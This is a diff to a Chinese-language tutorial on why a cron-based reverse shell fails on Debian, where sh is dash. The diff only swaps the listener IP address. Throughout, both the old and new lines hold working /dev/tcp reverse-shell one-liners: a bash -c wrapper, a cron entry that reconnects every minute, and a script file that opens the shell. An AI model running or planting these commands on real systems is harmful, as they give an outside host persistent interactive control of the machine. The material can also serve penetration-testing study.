@@ -60,12 +60,12 @@ $ cat /tmp/error.txt
 Debian下，`sh->dash`，也就是说，要用dash去把反弹bash，这是出错的根本原因。
 
 ```shell
-# bash -i >& /dev/tcp/10.2.196.17/7777 0>&1           
+# bash -i >& /dev/tcp/192.168.63.130/7777 0>&1           
 dash: 2: Syntax error: Bad fd number
 # ^C
-# /bin/bash -i >& /dev/tcp/10.2.196.17/7777 0>&1
+# /bin/bash -i >& /dev/tcp/192.168.63.130/7777 0>&1
 dash: 3: Syntax error: Bad fd number
-# /bin/bash -c >& /dev/tcp/10.2.196.1
+# /bin/bash -c >& /dev/tcp/192.168.63.130
 ```
 
 > 但是dash为什么不能反弹bash？
@@ -73,13 +73,13 @@ dash: 3: Syntax error: Bad fd number
 所以，其实可以使用`bash -c`执行命令，而这个命令是反弹交互式bash shell；
 
 ```shell
-bash -c "bash -i >& /dev/tcp/10.2.196.17/7777 0>&1"
+bash -c "bash -i >& /dev/tcp/192.168.63.130/7777 0>&1"
 ```
 
 也就是，定时任务反弹shell可以写成这样
 
 ```shell
-* * * * * *  bash -c "bash -i  >&/dev/tcp/10.2.196.17/7777 0>&1"
+* * * * * *  bash -c "bash -i  >&/dev/tcp/192.168.63.130/7777 0>&1"
 ```
 
 ### 使用脚本文件
@@ -89,7 +89,7 @@ bash -c "bash -i >& /dev/tcp/10.2.196.17/7777 0>&1"
 $ vim /temp/test.sh
 # 文件内容如下
 # !/bin/bash
-/bin/bash -i >& /dev/tcp/10.2.196.17/7777 0>&1
+/bin/bash -i >& /dev/tcp/192.168.63.130/7777 0>&1
 
 # 加上执行权限
 $ chmod +x /tmp/test.sh
